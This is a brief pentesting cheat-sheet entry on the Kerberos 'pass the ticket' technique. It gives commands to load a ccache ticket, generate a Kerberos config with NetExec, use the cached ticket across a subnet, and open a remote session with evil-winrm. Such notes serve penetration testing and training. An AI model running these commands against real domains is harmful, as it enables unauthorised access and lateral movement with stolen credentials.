## Pass the Ticket

Export the ccache File
`export KRB5CCNAME=ticket.ccache`

NetExec can create Kerberos configuration files
`nxc smb <dc-ip> --generate-krb5 <filename>.conf`

Pass the ticket with NetExec
`nxc smb 172.16.5.0/24 --use-kcache`

abuse ticket with evil-winrm
`evil-winrm -ip <FQDN> --realm <DOMAIN>`

